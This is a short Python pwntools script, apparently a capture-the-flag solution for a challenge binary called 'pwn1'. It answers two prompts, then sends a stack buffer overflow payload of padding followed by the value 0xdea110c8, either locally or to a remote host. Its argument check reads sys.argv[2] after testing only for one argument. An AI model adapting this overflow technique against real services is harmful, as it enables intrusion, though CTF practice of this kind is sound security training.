from pwn import *

context(os="linux", arch="i386")
context.log_level = "debug"

HOST = "target"
PORT = 8080
conn = None

if len(sys.argv) > 1 and sys.argv[2] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process("./pwn1")

conn.recvuntil("name?")
conn.sendline("Sir Lancelot of Camelot")
conn.recvuntil("quest?")
conn.sendline("To seek the Holy Grail.")
conn.recvuntil("secret?")
payload=b'a'*(0x3b-0x10)
payload+=p32(0xdea110c8)
conn.sendline(payload)
conn.recvall()
